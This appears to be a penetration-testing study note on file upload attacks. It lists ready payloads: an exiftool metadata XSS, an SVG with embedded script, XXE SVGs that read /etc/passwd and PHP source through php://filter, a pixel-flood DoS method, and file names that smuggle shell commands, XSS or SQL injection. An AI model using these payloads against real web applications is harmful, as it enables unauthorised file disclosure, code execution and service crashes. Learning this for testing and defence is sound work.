# Other Upload Attacks

Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.

## XSS

On file: `HTML, JS, SVG, GIF`

Introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

**If web applications display an image's metadata after its upload.**

```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' evil-image.jpg
```

> When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack

XSS attacks can also be carried with `SVG` images, along with several other attacks

We can write the following to `payload.svg`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
```

> Once we upload the `payload.svg` to the web application, the XSS payload will be triggered whenever the image is displayed.

## XXE

We can also include malicious XML data to  to leak the source code of the web application.

The following example can be used for an SVG image `payload.svg` that leaks the content of (/etc/passwd)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

> Once the SVG image is displayed, we should get the base64 encoded content which we can decode to read the source code.

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like : `PDF`, `Word Documents - DOC`, `PowerPoint Documents - PPT`, `XML, SVG` among many others.

## DoS

Another possible DoS attack is:
- `Pixel Flood` attack with some image files that utilize image compression, like `ZIP, JPG, PNG`

> We can create any JPG image file with any image size (e.g. 500x500), and then manually modify its compression data to say it has a size of (0xffff x 0xffff), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

## Injections in File Name

Rename the value of filename such as

```sh
filename="file$(whoami).jpg"
filename="file`whoami`.jpg"
filename="file.jpg||whoami"
```

Use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is disabled to them. 

Also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.